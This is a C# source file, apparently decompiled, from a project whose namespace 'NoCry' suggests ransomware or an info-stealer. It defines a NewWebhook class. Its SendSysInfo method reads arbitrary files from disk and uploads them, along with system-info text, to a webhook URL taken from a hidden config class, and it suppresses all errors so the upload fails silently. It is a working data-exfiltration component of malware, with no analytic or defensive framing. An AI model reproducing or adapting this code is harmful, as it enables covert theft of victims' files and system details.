using System;
using System.IO;
using System.Net;
using System.Net.Http;
using Microsoft.VisualBasic.CompilerServices;

namespace NoCry;

internal class NewWebhook
{
	public static string webhookk = St.webhook;

	public static string name = St.hash;

	private HttpClient _Client;

	private string _URL;

	public string _name { get; set; }

	public NewWebhook(string _webhookUrl)
	{
		_Client = new HttpClient();
		_URL = _webhookUrl;
	}

	public bool SendSysInfo(string content, string stringg, string filee)
	{
		bool result2 = default(bool);
		try
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(content), "content");
			if (filee != null)
			{
				byte[] content2 = File.ReadAllBytes(filee);
				multipartFormDataContent.Add(new ByteArrayContent(content2), filee, stringg);
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			result2 = result.StatusCode == HttpStatusCode.NoContent;
			return result2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	public bool sendst(string content)
	{
		bool result2 = default(bool);
		try
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(content), "content");
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			result2 = result.StatusCode == HttpStatusCode.NoContent;
			return result2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result2;
		}
	}
}
